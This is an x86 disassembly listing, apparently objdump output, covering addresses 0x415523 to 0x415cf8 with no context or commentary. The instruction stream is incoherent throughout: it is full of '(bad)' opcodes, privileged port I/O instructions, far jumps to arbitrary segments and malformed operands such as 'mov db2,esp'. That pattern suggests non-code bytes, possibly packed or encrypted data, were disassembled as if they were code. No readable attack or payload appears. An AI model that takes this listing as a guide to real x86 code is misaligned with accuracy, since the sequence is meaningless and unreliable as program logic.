  415523:	sub    DWORD PTR [ecx],ebx
  415525:	mov    edi,0x4dd67b52
  41552a:	xchg   BYTE PTR [edx-0x38bc0baf],dh
  415530:	dec    ebx
  415531:	jns    0x41559e
  415533:	sbb    ebp,DWORD PTR ds:0x3e5b73eb
  415539:	daa    
  41553a:	adc    BYTE PTR [ecx+0x1463355e],ch
  415540:	xchg   esp,eax
  415541:	ficom  DWORD PTR [esi-0x41]
  415544:	cmp    esp,DWORD PTR [eax]
  415546:	cmc    
  415547:	mov    dl,0x9d
  415549:	enter  0x997,0x75
  41554d:	(bad)  
  41554e:	jne    0x4155ae
  415550:	mov    edx,0xaac71f76
  415555:	shr    BYTE PTR [eax-0x5485560d],0x63
  41555c:	sbb    BYTE PTR [edi],dl
  41555e:	es test eax,0x37a1abee
  415564:	in     eax,dx
  415565:	cmp    ch,ch
  415567:	stos   DWORD PTR es:[di],eax
  415569:	jo     0x4155ca
  41556b:	or     al,BYTE PTR [ecx]
  41556d:	je     0x415584
  41556f:	inc    eax
  415570:	mov    esp,DWORD PTR [edx]
  415572:	cmp    BYTE PTR [ebx],bl
  415574:	lock cwde 
  415576:	jp     0x415594
  415578:	add    edx,DWORD PTR [eax+0x2f]
  41557b:	stos   DWORD PTR es:[edi],eax
  41557c:	ret    0xed6
  41557f:	mov    edx,0x57b92a70
  415584:	adc    eax,0x4758138e
  415589:	jle    0x415525
  41558b:	lods   eax,DWORD PTR ds:[esi]
  41558c:	(bad)  
  41558d:	sahf   
  41558e:	ficomp DWORD PTR [esi-0x4b58fcce]
  415594:	pushf  
  415595:	inc    eax
  415596:	cmc    
  415597:	jbe    0x41554e
  415599:	mov    ah,0xd7
  41559b:	(bad)  
  41559c:	fdivr  st(3),st
  41559e:	lock ds (bad) 
  4155a2:	push   esp
  4155a3:	cs stos BYTE PTR es:[edi],al
  4155a5:	mov    WORD PTR [ebp-0x2d287037],?
  4155ab:	and    edi,DWORD PTR [ebx-0x4540967e]
  4155b1:	push   edx
  4155b2:	inc    edi
  4155b3:	retf   
  4155b4:	scas   al,BYTE PTR es:[edi]
  4155b5:	shl    ecx,1
  4155b7:	test   al,0x7c
  4155b9:	aam    0xc0
  4155bb:	sub    edi,DWORD PTR [ebx-0x1dc66951]
  4155c1:	fdiv   QWORD PTR [ecx-0x14]
  4155c4:	int3   
  4155c5:	or     DWORD PTR [eax+0x3d18ddbf],esi
  4155cb:	mov    ebp,0xd0ebd56
  4155d0:	cdq    
  4155d1:	in     eax,dx
  4155d2:	ins    BYTE PTR es:[edi],dx
  4155d3:	mov    bl,BYTE PTR [eax+ecx*8]
  4155d6:	jne    0x415606
  4155d8:	xchg   esp,eax
  4155d9:	loope  0x415590
  4155db:	lods   eax,DWORD PTR ds:[esi]
  4155dc:	cs (bad) 
  4155de:	fnstsw WORD PTR ds:0x9fa4aadc
  4155e4:	in     al,dx
  4155e5:	jmp    0x41562b
  4155e7:	in     al,0xcb
  4155e9:	mov    esi,0xf9ead8aa
  4155ee:	(bad)  
  4155ef:	shl    DWORD PTR [ebp+eax*1+0x54],1
  4155f3:	add    dl,BYTE PTR [ebp+0x74622d8e]
  4155f9:	pop    esi
  4155fa:	cmp    al,0x5e
  4155fc:	ja     0x4155cd
  4155fe:	int    0x39
  415600:	and    esi,DWORD PTR [eax-0x66ac377b]
  415606:	push   ecx
  415607:	mov    BYTE PTR [esi],bh
  415609:	test   eax,0xdc96d50c
  41560e:	mov    cl,0x29
  415610:	fsubr  DWORD PTR [edx]
  415612:	push   0x372afb68
  415617:	jne    0x415697
  415619:	lods   al,BYTE PTR ds:[esi]
  41561a:	dec    edi
  41561b:	popf   
  41561c:	bound  ebp,QWORD PTR [ecx]
  41561e:	xor    al,0xe7
  415620:	fdiv   DWORD PTR [edx+0x44acc0ad]
  415626:	cmp    ebp,DWORD PTR [ecx+0x4901530d]
  41562c:	rcr    DWORD PTR [eax-0x4f],1
  41562f:	jnp    0x415696
  415631:	inc    ebp
  415632:	xor    ecx,DWORD PTR [edx]
  415634:	inc    eax
  415635:	aas    
  415636:	repz fcomp DWORD PTR [ebp-0x43]
  41563a:	jnp    0x415659
  41563c:	mov    ecx,0x5a696a71
  415641:	lahf   
  415642:	test   al,0xb4
  415644:	push   cs
  415645:	es ds jns 0x41566a
  415649:	xchg   ebx,eax
  41564a:	in     eax,0x34
  41564c:	push   ecx
  41564d:	arpl   WORD PTR [edi+0x22],di
  415650:	mov    esp,0xadd78c02
  415655:	jge    0x415638
  415657:	xor    eax,0xfc8af08a
  41565c:	adc    esp,DWORD PTR [edx+0x3aed612c]
  415662:	test   DWORD PTR [edi+edi*4],edi
  415665:	das    
  415666:	xlat   BYTE PTR ds:[ebx]
  415667:	pop    edx
  415668:	cli    
  415669:	mov    ds:0xa28aa0f3,al
  41566e:	inc    eax
  41566f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415670:	fisubr WORD PTR [ebp-0x12c892dd]
  415676:	push   ds
  415677:	mov    db2,esp
  41567a:	mov    al,0xd4
  41567c:	ror    DWORD PTR [esi-0x39],cl
  41567f:	sar    BYTE PTR [eax-0x6b],1
  415682:	adc    eax,0xfc4fe445
  415687:	test   eax,0xad79f1a7
  41568c:	arpl   WORD PTR [eax+0x377688c4],di
  415692:	mov    DWORD PTR [esi],ebx
  415694:	js     0x4156f2
  415696:	jmp    0x41568f
  415698:	jp     0x415716
  41569a:	in     al,dx
  41569b:	adc    al,0xb8
  41569d:	sub    eax,0xd41f78f7
  4156a2:	ret    
  4156a3:	icebp  
  4156a4:	cli    
  4156a5:	sub    dh,BYTE PTR [edx-0x5a]
  4156a8:	loope  0x41568b
  4156aa:	add    edi,0xbb42add8
  4156b0:	fidiv  DWORD PTR [edi]
  4156b2:	popf   
  4156b3:	arpl   WORD PTR ds:0x10d59d47,cx
  4156b9:	push   0x5188ee38
  4156be:	jge    0x415717
  4156c0:	pusha  
  4156c1:	loope  0x41565f
  4156c3:	jne    0x4156a9
  4156c5:	push   ds
  4156c6:	out    dx,eax
  4156c7:	xchg   DWORD PTR [ebx],eax
  4156c9:	lods   eax,DWORD PTR ds:[esi]
  4156ca:	retf   0x4348
  4156cd:	cmp    eax,0x39897482
  4156d2:	xchg   ebp,edi
  4156d4:	pop    ds
  4156d5:	add    BYTE PTR [eax],al
  4156d7:	cmp    edx,DWORD PTR [ebp+eax*2+0x19]
  4156db:	and    DWORD PTR [ebp-0x2eb2d64e],ebx
  4156e1:	push   es
  4156e2:	sbb    dh,dh
  4156e4:	pop    ecx
  4156e5:	dec    eax
  4156e6:	arpl   WORD PTR [edx],di
  4156e8:	push   eax
  4156e9:	lea    edi,[edi]
  4156eb:	cmc    
  4156ec:	jle    0x41567b
  4156ee:	cmc    
  4156ef:	push   esp
  4156f0:	fnstcw WORD PTR [ebx]
  4156f2:	(bad)  
  4156f3:	xchg   edi,eax
  4156f4:	mov    dh,0xd5
  4156f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f7:	cmp    DWORD PTR [edx-0x452c72ee],eax
  4156fd:	jmp    0x415681
  4156ff:	loop   0x4156ab
  415701:	nop
  415702:	aad    0xd0
  415704:	mov    edx,0xa54e7b91
  415709:	outs   dx,BYTE PTR ds:[esi]
  41570a:	fs xor al,0x53
  41570d:	jb     0x41576c
  41570f:	adc    eax,0xf219ea43
  415714:	mov    ecx,0xea53724f
  415719:	in     eax,0x3d
  41571b:	jl     0x41576a
  41571d:	inc    ebx
  41571e:	mov    eax,cs
  415720:	in     eax,0x89
  415722:	out    dx,eax
  415723:	daa    
  415724:	and    esi,edi
  415726:	nop
  415727:	sbb    bh,BYTE PTR [ebx]
  415729:	sub    bl,BYTE PTR [ebp+0x57]
  41572c:	and    ebp,DWORD PTR [esi+0x6468014d]
  415732:	xchg   esp,eax
  415733:	add    edx,DWORD PTR ds:0x32b915a9
  415739:	push   ecx
  41573a:	out    dx,al
  41573b:	sbb    eax,0xc165cfbb
  415740:	iret   
  415741:	call   0x60ca:0x17d577d2
  415748:	pop    edx
  415749:	jmp    0x8b8f:0x283abed0
  415750:	mov    bl,0x55
  415752:	xchg   edi,eax
  415753:	pushf  
  415754:	jle    0x415781
  415756:	ret    
  415757:	or     ebx,ebp
  415759:	daa    
  41575a:	sti    
  41575b:	scas   al,BYTE PTR es:[edi]
  41575c:	fidivr WORD PTR [esp+eax*8-0x455c2a86]
  415763:	mov    ds:0xf7adef52,eax
  415768:	push   edx
  415769:	pop    ss
  41576a:	jmp    0xa2fa:0xabe49f28
  415771:	mov    edx,0x3576b5d4
  415776:	xor    al,0x50
  415778:	out    0xa8,al
  41577a:	repz dec edx
  41577c:	pop    es
  41577d:	jmp    0x3d7d0363
  415782:	mov    ?,WORD PTR [edi-0x71a2671c]
  415788:	cmp    DWORD PTR [ebp+0x0],0xffffffaa
  41578c:	dec    eax
  41578d:	and    DWORD PTR [edi],esi
  41578f:	je     0x41577e
  415791:	cmp    esi,DWORD PTR ds:0x4a23a76a
  415797:	inc    ecx
  415798:	adc    al,0x5d
  41579a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41579b:	arpl   WORD PTR [edx+ebx*2-0x7ab537ad],dx
  4157a2:	clc    
  4157a3:	stc    
  4157a4:	push   esp
  4157a5:	in     al,0xa7
  4157a7:	mov    ah,0xa8
  4157a9:	adc    dl,al
  4157ab:	enter  0x6ca6,0x32
  4157af:	jne    0x4157a3
  4157b1:	push   esp
  4157b2:	rcr    DWORD PTR [eax+0x47],1
  4157b5:	sbb    eax,0x192ea365
  4157ba:	(bad)  
  4157bb:	push   esp
  4157bc:	(bad)  
  4157bd:	jge    0x4157d4
  4157bf:	cmp    DWORD PTR [ebp-0x2a],esp
  4157c2:	mov    esi,0xdcb9083b
  4157c7:	push   esp
  4157c8:	adc    ebp,edx
  4157ca:	jmp    0x41577f
  4157cc:	into   
  4157cd:	dec    edx
  4157ce:	out    dx,al
  4157cf:	fst    DWORD PTR [ecx+edi*2]
  4157d2:	add    ch,BYTE PTR [edi+0x52127911]
  4157d8:	arpl   WORD PTR [edi+0x35],sp
  4157db:	dec    edx
  4157dc:	sub    bl,BYTE PTR [edi+ebp*8]
  4157df:	loope  0x41585d
  4157e1:	mov    al,0x9f
  4157e3:	pushf  
  4157e4:	aaa    
  4157e5:	addr16 es jmp 0x41582e
  4157e9:	xchg   ecx,eax
  4157ea:	push   esp
  4157eb:	shl    DWORD PTR [esp+eiz*8],0xd1
  4157ef:	jno    0x415862
  4157f1:	or     al,0xd3
  4157f3:	shl    BYTE PTR [edi],cl
  4157f5:	into   
  4157f6:	inc    edi
  4157f7:	cmp    esi,edx
  4157f9:	fnstsw WORD PTR [ecx+0x3a]
  4157fc:	lgs    ebx,FWORD PTR [edi+eax*2-0x7d]
  415801:	aad    0x36
  415803:	fadd   DWORD PTR [edi]
  415805:	push   ss
  415806:	xor    eax,0x3a980504
  41580b:	inc    esi
  41580c:	jg     0x41580b
  41580e:	inc    edi
  41580f:	adc    eax,0xbc339f1c
  415814:	jb     0x4157b6
  415816:	push   ebp
  415817:	adc    BYTE PTR [ebp+0x7d],0x75
  41581b:	out    dx,eax
  41581c:	sbb    BYTE PTR [ecx+0x67be093b],dl
  415822:	jg     0x415819
  415824:	jle    0x41582b
  415826:	retf   
  415827:	inc    esi
  415828:	mov    eax,ds:0xfaafb63e
  41582d:	mov    eax,ds:0x8fe1e0f6
  415832:	mov    dh,0xaf
  415834:	xchg   esp,eax
  415835:	lahf   
  415836:	inc    eax
  415837:	push   ecx
  415838:	inc    ebp
  415839:	scas   al,BYTE PTR es:[edi]
  41583a:	mov    ds:0xacaaf61e,eax
  41583f:	sbb    eax,0x9cbc1c98
  415844:	and    eax,0x5fdc5acd
  415849:	add    eax,0xfbb5dfc0
  41584e:	test   edi,0x321c8719
  415854:	adc    BYTE PTR [edx],ch
  415856:	jecxz  0x4158aa
  415858:	popf   
  415859:	mov    eax,0x611c4ab0
  41585e:	jns    0x4157ff
  415860:	jle    0x415811
  415862:	dec    eax
  415863:	pop    esp
  415864:	mov    al,BYTE PTR [ebp+0x78]
  415867:	mov    edi,0x1a526a7b
  41586c:	pop    es
  41586d:	push   ss
  41586e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586f:	push   edi
  415870:	fstp   QWORD PTR [eax]
  415872:	inc    ebp
  415873:	cmp    ebx,DWORD PTR [edx]
  415875:	sub    BYTE PTR ds:0x3d28c752,al
  41587b:	push   ebx
  41587c:	mov    ds:0x3118fa74,eax
  415881:	fdiv   QWORD PTR [edx+esi*1+0x72a4132d]
  415888:	push   eax
  415889:	aam    0xa5
  41588b:	adc    BYTE PTR [eax+ebx*4+0x38f76544],0x72
  415893:	xchg   DWORD PTR [ebp+0x6015bf67],edi
  415899:	je     0x415827
  41589b:	add    BYTE PTR [edi-0x5ae9cd0b],ah
  4158a1:	mov    ds:0xb050454,al
  4158a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a7:	into   
  4158a8:	mov    esp,0x41734ae
  4158ad:	jecxz  0x415879
  4158af:	out    0x4b,al
  4158b1:	pop    ecx
  4158b2:	mov    DWORD PTR [edx],edi
  4158b4:	add    BYTE PTR [esi+0x4b],bl
  4158b7:	mov    al,0x2e
  4158b9:	test   DWORD PTR [edx+ecx*8],ebp
  4158bc:	or     BYTE PTR [eax],ch
  4158be:	shr    DWORD PTR [ecx-0x75e57438],cl
  4158c4:	sbb    al,BYTE PTR [ebx]
  4158c6:	aas    
  4158c7:	out    0x3d,eax
  4158c9:	pushf  
  4158ca:	aaa    
  4158cb:	xor    eax,0xf23a9626
  4158d0:	push   ebp
  4158d1:	xchg   esp,eax
  4158d2:	rcr    BYTE PTR [eax+ebp*2+0x351af59f],cl
  4158d9:	loop   0x41586d
  4158db:	xchg   ecx,eax
  4158dc:	xor    eax,0x1d53ead
  4158e1:	mov    edi,0x34cfb6ae
  4158e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e7:	je     0x415879
  4158e9:	aad    0x90
  4158eb:	int3   
  4158ec:	arpl   WORD PTR [eax-0x53],di
  4158ef:	fistp  DWORD PTR [ebp-0x79727d7b]
  4158f5:	dec    ebx
  4158f6:	adc    ecx,edi
  4158f8:	iret   
  4158f9:	mov    bh,0x97
  4158fb:	inc    edx
  4158fc:	mov    ds:0x50e75c88,eax
  415901:	push   es
  415902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415903:	add    ch,BYTE PTR [ebx-0x43e7a350]
  415909:	shl    DWORD PTR [edi],1
  41590b:	push   esi
  41590c:	or     eax,DWORD PTR [edi]
  41590e:	pop    edi
  41590f:	inc    ebp
  415910:	outs   dx,BYTE PTR ds:[esi]
  415911:	pop    esp
  415912:	cmp    ch,BYTE PTR [eax+0x45]
  415915:	ins    BYTE PTR es:[edi],dx
  415916:	or     eax,0x6bc63c37
  41591b:	push   ss
  41591c:	jmp    0xc52b:0x23ddfbd0
  415923:	jbe    0x415969
  415925:	push   esi
  415926:	out    dx,eax
  415927:	adc    esi,DWORD PTR [ecx]
  415929:	dec    edx
  41592a:	rcl    esp,0x18
  41592d:	fidiv  DWORD PTR [ecx]
  41592f:	cmp    al,0x96
  415931:	stos   DWORD PTR es:[edi],eax
  415932:	ins    DWORD PTR es:[edi],dx
  415933:	in     eax,dx
  415934:	stos   BYTE PTR es:[edi],al
  415935:	bnd jmp 0x41592f
  415938:	pushf  
  415939:	js     0x415948
  41593b:	mov    eax,ds:0x91560294
  415940:	scas   eax,DWORD PTR es:[edi]
  415941:	aad    0xaa
  415943:	repnz test eax,0x9476092c
  415949:	or     DWORD PTR [ecx+0x4e],eax
  41594c:	xchg   ebp,eax
  41594d:	sbb    DWORD PTR [esi-0x755d18a5],0xffffff9c
  415954:	int    0x90
  415956:	dec    ebp
  415957:	sub    BYTE PTR ds:0xd7cc2c9f,cl
  41595d:	mov    eax,0x8cd95898
  415962:	mov    dl,0x3e
  415964:	mov    cs,WORD PTR [ebx-0x1409129d]
  41596a:	(bad)
  41596d:	or     esi,DWORD PTR [ebp+0x38]
  415970:	or     BYTE PTR [ecx-0x79],dl
  415973:	xor    al,0xbc
  415975:	jecxz  0x4159f6
  415977:	mov    ss,WORD PTR [edi-0x3d]
  41597a:	xchg   edi,eax
  41597b:	jbe    0x415961
  41597d:	xor    dl,bh
  41597f:	shl    BYTE PTR [ecx+0x7655ff6d],1
  415985:	into   
  415986:	jmp    0xcb36:0x7577a8b4
  41598d:	icebp  
  41598e:	jmp    0x3538:0xd46235dc
  415995:	mov    WORD PTR [edi+ebx*4+0x1b],fs
  415999:	arpl   dx,bp
  41599b:	icebp  
  41599c:	iret   
  41599d:	fldenv [esi+0x9]
  4159a0:	mov    al,ds:0x815af55
  4159a5:	jne    0x4159e3
  4159a7:	sub    bl,BYTE PTR [ebx]
  4159a9:	gs sbb al,0x2d
  4159ac:	stos   DWORD PTR es:[edi],eax
  4159ad:	lahf   
  4159ae:	fist   WORD PTR [edi-0x492f3c3e]
  4159b4:	sbb    cl,BYTE PTR [ebp+0x7e94f598]
  4159ba:	or     BYTE PTR [eax+0x5188d493],ah
  4159c0:	inc    ecx
  4159c1:	mov    dl,0x21
  4159c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c4:	xchg   ebp,eax
  4159c5:	pop    edx
  4159c6:	pop    ecx
  4159c7:	(bad)  
  4159c8:	call   0x412bdadc
  4159cd:	cmp    al,0xde
  4159cf:	loop   0x415a06
  4159d1:	xchg   ebp,eax
  4159d2:	aam    0x47
  4159d4:	arpl   WORD PTR [eax-0x5b],si
  4159d7:	push   eax
  4159d8:	and    esi,DWORD PTR [esi+0x63]
  4159db:	push   edx
  4159dc:	jmp    0x95ef:0x6d310f47
  4159e3:	dec    edx
  4159e4:	shl    DWORD PTR [eax],cl
  4159e6:	mov    ah,0xef
  4159e8:	dec    ebp
  4159e9:	imul   ecx,DWORD PTR [ebx-0x2a872e13],0x3fd6bbd8
  4159f3:	test   DWORD PTR [esi],0xefe327ec
  4159f9:	pop    edx
  4159fa:	fimul  DWORD PTR [ecx]
  4159fc:	mov    ecx,0xc52b3f4e
  415a01:	lods   al,BYTE PTR ds:[esi]
  415a02:	sahf   
  415a03:	ja     0x4159ad
  415a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a06:	ds push ebp
  415a08:	sbb    BYTE PTR ds:0x74c92abf,bl
  415a0e:	call   FWORD PTR [esi]
  415a10:	bound  esi,QWORD PTR gs:[ebp-0x5c89be2c]
  415a17:	(bad)  
  415a18:	pop    ebp
  415a19:	inc    edi
  415a1a:	out    dx,al
  415a1b:	or     eax,0xdb707223
  415a20:	adc    BYTE PTR [ebx+0x36],al
  415a23:	inc    esp
  415a24:	inc    ebx
  415a25:	loop   0x415a24
  415a27:	test   al,0xef
  415a29:	jg     0x4159f2
  415a2b:	xor    BYTE PTR [eax+eiz*2],dh
  415a2e:	sti    
  415a2f:	pop    ebp
  415a30:	mov    ecx,0x527913ae
  415a35:	aam    0x43
  415a37:	xor    bh,dh
  415a39:	jmp    0xb4de:0xe456832a
  415a40:	mov    fs,WORD PTR [ecx+0x547ea821]
  415a46:	push   esi
  415a47:	mov    edi,0xbc1a8482
  415a4c:	xchg   BYTE PTR [edx-0x66],bl
  415a4f:	mov    ds:0x891dc888,eax
  415a54:	or     DWORD PTR [eax+0x6587ac1b],0xffffffce
  415a5b:	jmp    0x43dc:0x7c1cbc14
  415a62:	sub    ebp,DWORD PTR [eax]
  415a64:	xchg   ch,bl
  415a66:	jmp    0x415ac8
  415a68:	loop   0x415adc
  415a6a:	jb     0x415a13
  415a6c:	lods   eax,DWORD PTR ds:[esi]
  415a6d:	idiv   DWORD PTR [ebx-0x25842839]
  415a73:	lea    esp,[esi-0x34]
  415a76:	cmp    ah,BYTE PTR [ebx-0x3b]
  415a79:	mov    al,BYTE PTR [ebx+0x24674eed]
  415a7f:	fwait
  415a80:	dec    esp
  415a81:	inc    ecx
  415a82:	push   ecx
  415a83:	inc    ecx
  415a84:	cmp    DWORD PTR [ecx+0x40aa0b1a],esp
  415a8a:	cmp    al,0x8e
  415a8c:	mov    ds:0x34992a70,al
  415a91:	(bad)  
  415a92:	pop    edi
  415a93:	inc    ebp
  415a94:	dec    esi
  415a95:	lods   eax,DWORD PTR ds:[esi]
  415a96:	adc    eax,0x77ee436d
  415a9b:	mov    cl,dh
  415a9d:	mov    esi,0x44e13431
  415aa2:	sti    
  415aa3:	add    al,0xb2
  415aa5:	(bad)  
  415aa6:	push   ebp
  415aa7:	in     al,0x13
  415aa9:	pop    esp
  415aaa:	(bad)  
  415aab:	push   eax
  415aac:	popa   
  415aad:	sbb    DWORD PTR [edi+0x5fbc5852],edi
  415ab3:	jae    0x415ac0
  415ab5:	sahf   
  415ab6:	xlat   BYTE PTR ds:[ebx]
  415ab7:	mov    al,ds:0x533e344c
  415abc:	loope  0x415b31
  415abe:	lods   al,BYTE PTR ds:[esi]
  415abf:	popf   
  415ac0:	inc    edx
  415ac1:	sbb    eax,0x89bd5b6c
  415ac6:	dec    esi
  415ac7:	shr    DWORD PTR ds:[ecx+0x22],0x86
  415acc:	retf   
  415acd:	dec    eax
  415ace:	pop    edx
  415acf:	aaa    
  415ad0:	sti    
  415ad1:	stos   BYTE PTR es:[edi],al
  415ad2:	shl    BYTE PTR [esi+0x4dcb8629],0xf8
  415ad9:	(bad)  
  415ada:	fmul   st(0),st
  415adc:	or     DWORD PTR [ecx-0x11],0x4fda7de5
  415ae3:	test   bl,0x19
  415ae6:	xchg   esp,eax
  415ae7:	sub    ah,BYTE PTR [edi]
  415ae9:	fld    TBYTE PTR [edx+eiz*2-0x1b8ac7f8]
  415af0:	push   es
  415af1:	push   esp
  415af2:	leave  
  415af3:	pushf  
  415af4:	jl     0x415b4d
  415af6:	mov    DWORD PTR fs:[ebx-0x2a],ebp
  415afa:	mov    edi,DWORD PTR [esp+esi*4+0x455fb61e]
  415b01:	dec    al
  415b03:	xor    al,0xfb
  415b05:	call   0x1eaa5714
  415b0a:	pop    ecx
  415b0b:	cmp    eax,0x9117e523
  415b10:	sbb    ecx,DWORD PTR [ebp-0x5f711c4a]
  415b16:	inc    esp
  415b17:	iret   
  415b18:	and    esi,DWORD PTR [edx-0x6a]
  415b1b:	loop   0x415b71
  415b1d:	pop    ebp
  415b1e:	sub    DWORD PTR ds:0x9a757aec,0x19af694d
  415b28:	mov    ecx,0xe7eac3ac
  415b2d:	ja     0x415ac9
  415b2f:	pop    edi
  415b30:	or     BYTE PTR [ecx-0x2210f5d5],ch
  415b36:	dec    ecx
  415b37:	lods   al,BYTE PTR ss:[esi]
  415b39:	push   cs
  415b3a:	or     eax,0x516f3dc3
  415b3f:	aaa    
  415b40:	push   ss
  415b41:	les    ebp,FWORD PTR [edi+eax*8-0x1f1dc754]
  415b48:	in     al,dx
  415b49:	into   
  415b4a:	jge    0x415b6f
  415b4c:	push   ds
  415b4d:	int    0x51
  415b4f:	inc    edi
  415b50:	add    DWORD PTR [ecx-0x7289e5b],0xd391d744
  415b5a:	jl     0x415bda
  415b5c:	mov    edi,0x37acf23e
  415b61:	add    eax,0x55278c5
  415b66:	mov    ds:0x9f213406,eax
  415b6b:	rcl    DWORD PTR [eax+0x49],1
  415b6e:	outs   dx,DWORD PTR ds:[esi]
  415b6f:	sub    DWORD PTR [eax-0x6dfde757],edx
  415b75:	add    BYTE PTR [ebp-0x3b04dfdd],0xf6
  415b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b7d:	and    edx,DWORD PTR [edi+0x7c]
  415b80:	lods   eax,DWORD PTR ds:[esi]
  415b81:	and    ebx,0x77
  415b84:	or     ch,bh
  415b86:	or     al,0x80
  415b88:	mov    al,ds:0x127375a3
  415b8d:	cmp    cl,cl
  415b8f:	cld    
  415b90:	dec    esi
  415b91:	jmp    0x1580fe2f
  415b96:	cdq    
  415b97:	std    
  415b98:	jb     0x415b89
  415b9a:	dec    eax
  415b9b:	cmp    DWORD PTR [eax+0xc],esi
  415b9e:	xchg   ebp,eax
  415b9f:	mov    ah,0xbd
  415ba1:	and    edx,esi
  415ba3:	lock inc ecx
  415ba5:	or     eax,0x41cc955c
  415baa:	ficom  DWORD PTR ds:0x6d9b1553
  415bb0:	inc    ebp
  415bb1:	in     al,0x6c
  415bb3:	dec    ebp
  415bb4:	xchg   ebp,eax
  415bb5:	nop
  415bb6:	jno    0x415bf2
  415bb8:	lea    ebx,ds:0xed225f9f
  415bbe:	stos   BYTE PTR es:[edi],al
  415bbf:	cld    
  415bc0:	aad    0xa9
  415bc2:	test   al,0x41
  415bc4:	sub    ebx,DWORD PTR [eax+0x63aa9b2a]
  415bca:	aam    0x9b
  415bcc:	stos   BYTE PTR es:[edi],al
  415bcd:	rcl    DWORD PTR [ecx+0x20],cl
  415bd0:	push   esi
  415bd1:	adc    BYTE PTR [edx-0x5d],0xd6
  415bd5:	sti    
  415bd6:	pop    ecx
  415bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bd8:	or     edi,ebp
  415bda:	sar    DWORD PTR [ecx-0x795d89aa],cl
  415be0:	scas   eax,DWORD PTR es:[edi]
  415be1:	mul    BYTE PTR [ecx-0x3f0555c6]
  415be7:	mov    edx,0x31a8f9d5
  415bec:	xchg   ch,dh
  415bee:	dec    ecx
  415bef:	popf   
  415bf0:	inc    eax
  415bf1:	inc    esp
  415bf2:	into   
  415bf3:	push   ss
  415bf4:	pop    esp
  415bf5:	push   esi
  415bf6:	fisubr DWORD PTR [esi-0x38cd7a16]
  415bfc:	jmp    0xb2c8f9c9
  415c01:	jno    0x415ba0
  415c03:	mov    ebx,DWORD PTR [ebx-0xa]
  415c06:	out    dx,eax
  415c07:	lahf   
  415c08:	xor    eax,0xfb4fd9eb
  415c0d:	das    
  415c0e:	pop    es
  415c0f:	aaa    
  415c10:	pop    edi
  415c11:	jle    0x415c7c
  415c13:	push   ss
  415c14:	sub    ebp,DWORD PTR [eax+0x13bc69e2]
  415c1a:	rcl    cl,cl
  415c1c:	jbe    0x415c02
  415c1e:	or     dl,cl
  415c20:	mov    ?,WORD PTR [ebx-0x6ab0438d]
  415c26:	mov    ch,0xe4
  415c28:	add    DWORD PTR [ecx-0x19],ebx
  415c2b:	inc    esp
  415c2c:	in     al,0xcc
  415c2e:	inc    edx
  415c2f:	daa    
  415c30:	dec    esp
  415c31:	xchg   ebp,eax
  415c32:	jno    0x415c7e
  415c34:	cli    
  415c35:	mov    al,ds:0x946335d7
  415c3a:	mov    edx,0x227562ab
  415c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c40:	imul   ebx,DWORD PTR [esp+edi*2-0x456f73fb],0x14
  415c48:	lds    esi,FWORD PTR [ebp-0x7e]
  415c4b:	xor    al,0x6c
  415c4d:	loope  0x415c04
  415c4f:	cmp    ah,cl
  415c51:	dec    edx
  415c52:	icebp  
  415c53:	sub    bh,BYTE PTR [ecx-0x2e2eeaa9]
  415c59:	mov    eax,0x9157f523
  415c5e:	xor    edx,DWORD PTR [ebx+0x3bf1fc8e]
  415c64:	scas   eax,DWORD PTR es:[edi]
  415c65:	push   edi
  415c66:	sub    DWORD PTR [ebx],edi
  415c68:	jmp    0x759f:0xa4b5f1a0
  415c6f:	(bad)  
  415c70:	jg     0x415cc7
  415c72:	push   eax
  415c73:	lods   al,BYTE PTR ds:[esi]
  415c74:	mov    BYTE PTR [eax+eax*1],bl
  415c77:	fsubr  DWORD PTR [esi]
  415c79:	(bad)  
  415c7a:	mov    ch,0x5e
  415c7c:	cli    
  415c7d:	pop    ebp
  415c7e:	(bad)  
  415c7f:	jo     0x415cc4
  415c81:	xchg   ebx,eax
  415c82:	imul   BYTE PTR [ebp+0x32]
  415c85:	jb     0x415c57
  415c87:	imul   ebx,eax,0xa27aef5
  415c8d:	xor    al,0x94
  415c8f:	jne    0x415c5c
  415c91:	jmp    0xe753:0x50a5f5e0
  415c98:	dec    ecx
  415c99:	imul   edi,DWORD PTR [esi+0x4cca9c1b],0x40738101
  415ca3:	shr    BYTE PTR [eax-0x39],0xa8
  415ca7:	cs (bad) 
  415ca9:	xchg   ecx,eax
  415caa:	cmp    ecx,DWORD PTR ds:0x3a1a1207
  415cb0:	scas   eax,DWORD PTR es:[edi]
  415cb1:	cmc    
  415cb2:	cwde   
  415cb3:	fwait
  415cb4:	jge    0x415c91
  415cb6:	and    al,0xfa
  415cb8:	pop    eax
  415cb9:	inc    edi
  415cba:	push   cs
  415cbb:	sub    ch,BYTE PTR [edi+eax*2-0x3512ae19]
  415cc2:	mov    ebp,0x7545f7be
  415cc7:	push   eax
  415cc8:	in     eax,0x35
  415cca:	mov    ss,ecx
  415ccc:	in     al,0xe0
  415cce:	aad    0x88
  415cd0:	lods   eax,DWORD PTR ds:[esi]
  415cd1:	sti    
  415cd2:	ja     0x415ca3
  415cd4:	call   0xf8bc:0x58ce0f85
  415cdb:	pusha  
  415cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cdd:	fistp  DWORD PTR ds:0x32a98c49
  415ce3:	mov    eax,0x3ac038f0
  415ce8:	jb     0x415ccd
  415cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ceb:	loop   0x415c98
  415ced:	xor    ch,al
  415cef:	sti    
  415cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf1:	jge    0x415cca
  415cf3:	mov    ss,WORD PTR [ecx-0x5d]
  415cf6:	xlat   BYTE PTR ds:[ebx]
  415cf7:	cli    
  415cf8:	jge    0x415d3c
